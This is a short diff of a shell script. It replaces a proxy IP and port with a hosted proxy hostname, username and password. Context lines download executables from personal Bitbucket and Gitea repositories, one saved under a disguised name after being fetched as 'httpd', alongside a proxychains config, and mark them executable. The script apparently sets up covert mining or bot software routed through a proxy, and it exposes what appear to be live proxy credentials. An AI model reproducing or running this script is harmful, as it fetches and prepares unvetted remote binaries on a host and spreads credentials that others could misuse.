@@ -1,5 +1,7 @@
-proxy="192.252.209.155" 
-port="14455" 
+proxy="us-east-static-01.quotaguard.com" 
+port="9293" 
+user="myqkr8iy44nup7"  
+pass="1ykces857akwz08n0tye013db1n" 
 wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x vx
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
